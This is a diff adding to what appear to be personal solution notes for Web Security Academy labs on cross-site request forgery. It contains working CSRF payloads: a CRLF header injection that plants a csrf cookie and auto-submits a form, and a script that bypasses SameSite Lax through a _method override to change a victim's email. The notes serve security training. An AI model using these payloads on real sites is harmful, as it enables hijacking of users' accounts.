@@ -17,3 +17,10 @@
     </form>
     <img src="https://0ae800630314cfa683893c200074004f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();" />
     ```
+- Same site lax bypass via method override
+    - The samesite attribute defaults to Lax, which means the cookie will be sent in cross-site GET requests. Craft a payload that navigates to the change-email endpoint and uses the _method query parameter to override the HTTP request method.
+    ```
+    <script>
+    document.location = "https://0ac3000203ca9b4add16983800c00022.web-security-academy.net/my-account/change-email?email=pwnedo@web-security-academy.net&_method=POST";
+    </script>
+    ```
